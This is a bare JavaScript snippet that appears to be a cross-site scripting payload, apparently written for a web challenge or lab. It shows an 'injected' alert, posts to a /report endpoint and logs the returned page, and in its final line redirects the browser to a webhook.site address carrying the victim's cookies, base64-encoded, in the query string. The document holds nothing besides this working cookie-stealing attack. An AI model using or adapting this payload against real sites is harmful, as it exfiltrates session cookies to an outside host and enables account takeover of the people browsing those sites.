alert("injected");

fetch("/report", {
  method: "POST",
  body: new URLSearchParams({
    'id': '1'
  }),
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
})
.then(response => {
  if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
  }
  return response.text();
})
.then(html => {
  console.log(html); // Log the HTML code of the page
})
.catch(error => {
  console.error('Fetch Error:', error);
});

window.location = "https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?" + btoa(document.cookie);